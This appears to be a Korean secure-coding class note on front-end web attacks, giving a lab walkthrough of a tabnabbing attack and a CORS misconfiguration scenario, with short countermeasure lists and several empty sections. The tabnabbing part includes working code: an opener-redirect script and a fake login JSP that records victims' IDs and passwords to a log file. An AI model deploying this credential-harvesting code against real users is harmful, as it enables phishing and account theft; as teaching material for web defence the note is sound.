# Front-End 보안

Class: Secure Coding
Created: Mar 24, 2020 9:19 AM
Reviewed: No

### 웹 보안 영역 (시큐어코딩 X) ⇒ 웹 서버 관리자의 역할

### * 사용자 브라우저에 있는 정보를 해커 PC에 전달 (XSS 기반 공격)

### * 사용자가 원치 않는 행위를 수행

### * 시나리오 중심 이해

## 1. tabnabbing 공격

---

1. C:\Windows\System32\drivers\etc\hosts 파일을 관리자 권한으로 메모장에서 열어 다음과 유사하게 추가한다.

    [HOST_IP] openeg.com

    [HOST_IP] openeq.com

    [HOST_IP] insecure.com

2. 해커머신에서 404.html 을 생성 (게시글에서 링크 클릭했을 경우 생기는 페이지)

    <script>

    if(window.opener){

    opener.location='잘못된 로그인 페이지 주소';

    }else{

    document.querySelector("h1").innerHTML='The previous tab is safe and intact...';

    }

    </script>

3. 해커머신에서 fakeLogin.jsp (잘못된 로그인 페이지)을 생성

    <%@page import="java.util.Date"%>

    <%@page import="java.io.*"%>

    <%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

    <%

    String id = request.getParameter("userId");

    if (id == null) id = "";

    String pw = request.getParameter("userPw");

    if (pw == null) pw = "";

    String log = String.format("<br/>ID = [%s]\tPW = [%s]", new Object[] { id, pw });

    try {

    String filename= request.getSession().getServletContext().getRealPath("/log.html");

    FileWriter fw = new FileWriter(filename, true); //the true will append the new data

    fw.write(log);

    fw.close();

    } catch (IOException e) {

    e.printStackTrace();

    }

    System.out.println(log);

    response.sendRedirect("정상적인 로그인주소");  <!— 정상적인 로그인 주소!—>

    %>

4. 해커머신에서 fakeLogin.html (잘못된 로그인 페이지)를 생성
5. 해커서버 가동
6. 해커가 정상적인 로그인페이지에서 로그인 후 다음의 게시글을 생성

    <a href='잘못된 로그인 페이지 주소' target='_blank'>재밌는 영상은 여기~</a>

7. 희생자가 해당 게시글을 보고, 링크를 클릭
8. 404 에러 페이지가 생성되고, 기존의 로그인 페이지가 잘못된 로그인 페이지로 리다이렉트된다.
9. 희생자는 잘못된 로그인 페이지에서 재로그인한다.
10. 해커는 희생자의 계정정보를 탈취한다. (해커서버에서 확인)
11. 희생자는 자신의 계정정보가 탈취된 사실을 알지 못한다.

### 대응방안

- <a>, <src> 태그 및 HTML 5에 추가된 신규 태그<veidio> 등에 대한 실행 제한

## 2. CORS를 이용한 사용자 개인정보 탈취

---

### CORS의 역할

- 특정 조건을 만족할 경우 동일출처정책(SOP, Same Origin Policy)에 의한 제한을 완화하는 데 사용

### 서버 구성 (공격 시나리오)

- 구글 서버 (XSS에 취약)  : [insecure.com](http://insecure.com)
- 오픈이지 서버 : [openeg.com](http://openeg.com)

### (1) 구글 서버와 오픈이지 서버 간의 CORS 확인

1. WebContent>cors>insecure>에 (구글 서버) getUserInfo.jsp를 다음과 같이 작성후 크롬 웹브라우저에서 해당 페이지를 요청해 보면 admin 정보가 출력된다.

    <%@page import="java.util.*"%><%@page import="java.io.*"%><%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

    <%

    out.println("<h1>insecure.com의 관리자 정보: id=admin pw=insecure</h1>");

    %>

2. WebContent>cors>openeg>에 (오픈이지 서버)  getUserInfo.jsp를 다음과 같이 작성후 크롬 웹브라우저에서 해당 페이지[를](http://openeg.com:8181/openeg/cors/openeg/getUserInfo.jsp%EB%A5%BC) 요청해 보면 admin 정보가 출력된다.

    <%@page import="java.util.*"%><%@page import="java.io.*"%><%@ page lang

    uage="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

    <% out.println("{ \"id\":\"admin\", \"grade\":\"common\", \"company\":\"XXX\", \"email\":\"admin@open.com\", \"telephone\":\"010-999-00000\" }");

    %>

3. WebContent>cors>insecure> (구글 서버)에 sop_test.jsp를 다음과 같이 작성 후해당 페이지;[를](http://insecure.com:8181/openeg/cors/insecure/sop_test.jsp%EB%A5%BC) 실행하면 버튼이 두 개 보인다.

    <%@ page language="java" contentType="text/html; charset=UTF-8"

    pageEncoding="UTF-8"%>

    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

    <html>

    <head>

    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>Insert title here</title>

    <script src="../js/jquery-1.7.1.js"></script>

    <script type="text/javascript">

    var xhr;

    function a(){

    xhr = new XMLHttpRequest();

    var url='insecure 서버의 페이지 주소';

    xhr.open('GET',url);

    xhr.onload = function() {

    alert(xhr.responseText);

    };

    xhr.onerror = function() {

    alert('Woops, there was an error making the request.');

    };

    xhr.send();

    }

    function b(){

    xhr = new XMLHttpRequest();

    var url='openeg 서버의 페이지 주소';

    xhr.open('GET',url);

    xhr.onload = function() {

    alert(xhr.responseText);

    };

    xhr.onerror = function() {

    alert('Woops, there was an error making the request.');

    };

    xhr.send();

    }

    </script>

    </head>

    <body>

    <button onclick="a()" >XHR로 insecure 서버의 페이지 주소의 사용자 정보 보기</button><br><br>

    <button onclick="b()" >XHR로 openeg 서버의 페이지 주소의 사용자 정보 보기</button>

    </body>

    </html>

4. 윗 버튼을 누르면 insecure.com 이 오리진인 자바스크립트가 같은 스킴으로 getUserInfo.jsp를 요청하므로 사용자 정보가 잘 보인다.
5. 아래 버튼을 누르면 insecure.com 이 오리진인 자바스크립트가 다른 스킴([openeg.com](http://openeg.com/))으로 getUserInfo.jsp를 요청하므로 사용자 정보가 안 보인다.==>SOP(Same Origin Policy)때문!
6. WebContent>cors>openeg>getUserInfo.jsp (openeg 서버)에 다음 코드를 추가해 놓는다.  ⇒ 모든 오리진에서 사용자 정보가 잘 확인된다

### (2) 공격 시나리오

---

1. [insecure.com](http://insecure.com/) 사이트와 [openeg.com](http://openeg.com/) 사이트는 서로 신뢰 관계가 있다고 가정하고 WebContent>cors>openeg>getUserInfo.jsp에 다음 코드를 추가한다.

response.setHeader("Access-Control-Allow-Origin", "insecure.com 주소");

### 대응방안

---

- CORS 요청을 받는 페이지를 제한 (현실적으로 어려움)
- 취약한 파트너사의 서버에 XSS 대응 조치

## 3. WebSocket을 이용한 내부 네트워크 정보를 수집

---

## 4. WebStorage을 이용한 사용자 개인정보 수집

---

## 5. Web Worker를 이용한 DDoS 공격

---

### Web Worker

- 웹 브라우저에서 동작하는 스레드

### 공격 시나리오

---

### 대응방법

---

- XSS 공격 방어
- CORS 보안 대책
    - Cross Origin 요청을 허용하는 도메인을 명확하게 지정